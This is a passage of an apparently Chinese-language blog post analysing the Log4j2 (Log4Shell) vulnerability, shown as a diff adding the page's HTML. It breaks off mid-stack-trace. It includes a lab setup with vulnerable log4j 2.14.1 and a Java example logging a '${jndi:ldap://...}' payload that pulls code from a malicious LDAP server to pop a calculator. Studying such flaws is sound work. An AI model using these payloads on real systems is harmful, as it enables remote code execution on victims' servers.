@@ -1,0 +1,1038 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Web, Security, Web安全, Java, Java安全">
+    <meta name="description" content="记录一下我的网安学习">
+    <meta name="author" content="1diot9">
+    
+    <title>
+        
+            Log4j2漏洞分析 |
+        
+        1diot9&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/baka.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#CCCCCC","title":"1diot9's Blog","author":"1diot9","avatar":"/images/baka.png","logo":"/images/baka.png","favicon":"/images/baka.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"登上山顶的人沉默不语，半途而废者诉说着旅途的艰辛","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://www.github.com/1diot9","weixin":"img | /images/weixin.jpg","qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null},"img_align":"center"},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2025,"word_count":true,"site_deploy":{"enable":true,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/baka.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               1diot9&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                首页
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                归档
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                标签
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                分类
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
+                                
+                                关于
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            首页
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            归档
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            标签
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            分类
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            关于
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        Log4j2漏洞分析
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/baka.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">1diot9</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-12-08 14:47:26</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Mon Dec 08 2025 14:49:29 GMT+0800">2025-12-08 14:49:29</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>6.2k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>27 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>刚学JNDI时看过log4j2，但当时只是简单看了一下payload，对解析过程并不熟悉，现在来重新看一遍。</p>
+<p>这里的目标：</p>
+<p>1、了解漏洞的触发条件</p>
+<p>2、了解payload在组件中的解析过程，看懂字符串的处理过程，进而明白bypass的由来</p>
+<p>3、其他利用方式，包括其他协议以及不出网</p>
+<p>4、补丁分析与绕过</p>
+<p>5、jdk17下的利用</p>
+<p>6、为什么会触发多次</p>
+<p>文章涉及到的代码：<a class="link"   target="_blank" rel="noopener" href="https://github.com/1diot9/MyJavaSecStudy/tree/main/JNDI/Log4j2" >https://github.com/1diot9/MyJavaSecStudy/tree/main/JNDI/Log4j2<i class="fas fa-external-link-alt"></i></a></p>
+<p>测试环境：jdk8u65</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>这里先复现一下漏洞，看看效果。</p>
+<p>pom.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.test<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Log4j2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">log4j2.version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">log4j2.version</span>&gt;</span>     <span class="comment">&lt;!-- &lt;=2.14.1 有漏洞--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;log4j2.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;log4j2.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>resources&#x2F;log4j2.xml，里面有详细注释，帮助理解配置文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--status=&quot;WARN&quot;：控制 Log4j2 自身的内部日志级别（不是应用日志）。如果 Log4j2 出现错误或警告，会在控制台打印。--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--monitorInterval=&quot;30&quot;：表示每隔 30 秒检查一次配置文件是否被修改，如果修改了会自动重新加载。--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span> <span class="attr">monitorInterval</span>=<span class="string">&quot;30&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--日志输出目标--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--输出到控制台--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--时间戳 线程名 日志级别（INFO/DEBUG 等） Logger 名称，最多显示 36 个字符 日志消息 换行--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;yyyy-MM-dd HH:mm:ss&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--输出到文件 logs/app.log--&gt;</span>  <span class="comment">&lt;!--filePattern：日志滚动时的文件命名规则，例如 logs/app-2025-12-04-1.log.gz--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">RollingFile</span> <span class="attr">name</span>=<span class="string">&quot;File&quot;</span> <span class="attr">fileName</span>=<span class="string">&quot;logs/app.log&quot;</span> <span class="attr">filePattern</span>=<span class="string">&quot;logs/app-%d&#123;yyyy-MM-dd&#125;-%i.log.gz&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;yyyy-MM-dd HH:mm:ss&#125; %-5level %logger - %msg%n&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Policies</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">SizeBasedTriggeringPolicy</span> <span class="attr">size</span>=<span class="string">&quot;10MB&quot;</span>/&gt;</span>  <span class="comment">&lt;!--文件超过 10MB 时滚动--&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">TimeBasedTriggeringPolicy</span>/&gt;</span>    <span class="comment">&lt;!--按时间滚动（通常是每天）--&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Policies</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">DefaultRolloverStrategy</span> <span class="attr">max</span>=<span class="string">&quot;7&quot;</span>/&gt;</span>  <span class="comment">&lt;!--最多保留 7 个历史文件，超过会删除旧的--&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">RollingFile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--针对 com.example 包下的类，日志级别设为 error；这里代表error以上的才会被解析记录，所以只有error以上的才能触发漏洞；可以在java类中临时更改记录等级--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--additivity=&quot;false&quot; 表示不再向上级 Root Logger 传递日志，避免重复输出--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--trace &lt; debug &lt; info &lt; warn &lt; error &lt; fatal--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Logger</span> <span class="attr">name</span>=<span class="string">&quot;com.example&quot;</span> <span class="attr">level</span>=<span class="string">&quot;error&quot;</span> <span class="attr">additivity</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--绑定两个 Appender：控制台和文件--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;File&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Logger</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--所有没有单独配置的 Logger 都会走 Root--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>App.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.config.Configurator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(App.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* 临时修改记录的日志等级 */</span></span><br><span class="line">        Configurator.setLevel(<span class="string">&quot;com.example.App&quot;</span>, org.apache.logging.log4j.Level.DEBUG);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;$&#123;sys:user.name&#125;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;$&#123;sys:java.version&#125;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">vul</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:50389/71c916&#125;&quot;</span>;</span><br><span class="line">        logger.trace(<span class="string">&quot;跟踪信息&quot;</span>);</span><br><span class="line">        logger.debug(<span class="string">&quot;调试信息&quot;</span>);</span><br><span class="line">        logger.info(<span class="string">&quot;应用启动&quot;</span>);</span><br><span class="line">        logger.warn(<span class="string">&quot;警告示例&quot;</span>);</span><br><span class="line">        logger.error(<span class="string">&quot;错误示例&quot;</span>);</span><br><span class="line">        logger.fatal(<span class="string">&quot;致命错误示例&quot;</span>);</span><br><span class="line">        logger.trace(<span class="string">&quot;&#123;&#125;&quot;</span>, username);</span><br><span class="line">        logger.info(<span class="string">&quot;&#123;&#125;&quot;</span>, str2);</span><br><span class="line">        logger.info(<span class="string">&quot;&#123;&#125;&quot;</span>, vul);</span><br><span class="line"><span class="comment">//        logger.error(&quot;&#123;&#125;&quot;,vul);</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">1</span> / <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;发生异常&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>恶意ldap服务器我用java-chains起：</p>
+<p><img   src="https://1diot9-github-io.oss-cn-beijing.aliyuncs.com/img/1764993501328-b6e89fe7-a09a-4cd6-9bb2-b2ff92406d4c.png"  alt="img"></p>
+<p>运行后成功执行calc，而且是弹了4个。</p>
+<h1 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h1><h2 id="触发条件分析"><a href="#触发条件分析" class="headerlink" title="触发条件分析"></a>触发条件分析</h2><p>除了组件版本&lt;&#x3D;2.14.1，设置的日志输出等级也会影响是否能触发漏洞。因为这里漏洞触发的本质是，组件需要打印日志，所以才去解析用户输入。如果组件判断不需要打印日志的话，就不会有解析这一步了。</p>
+<p>我直接在javax.naming.spi.DirectoryManager#getObjectInstance打断点，因为触发的ldap，所以最后肯定会到这儿。复制一下堆栈：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">getObjectInstance:<span class="number">161</span>, DirectoryManager (javax.naming.spi)</span><br><span class="line">c_lookup:<span class="number">1085</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">lookup:<span class="number">172</span>, JndiManager (org.apache.logging.log4j.core.net)</span><br><span class="line">lookup:<span class="number">56</span>, JndiLookup (org.apache.logging.log4j.core.lookup)</span><br><span class="line">lookup:<span class="number">221</span>, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:<span class="number">1110</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">1033</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">912</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:<span class="number">467</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:<span class="number">132</span>, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">format:<span class="number">38</span>, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:<span class="number">344</span>, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:<span class="number">244</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">229</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">59</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:<span class="number">197</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:<span class="number">190</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:<span class="number">181</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:<span class="number">156</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:<span class="number">129</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:<span class="number">120</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:<span class="number">84</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:<span class="number">540</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:<span class="number">498</span>, LoggerConfig 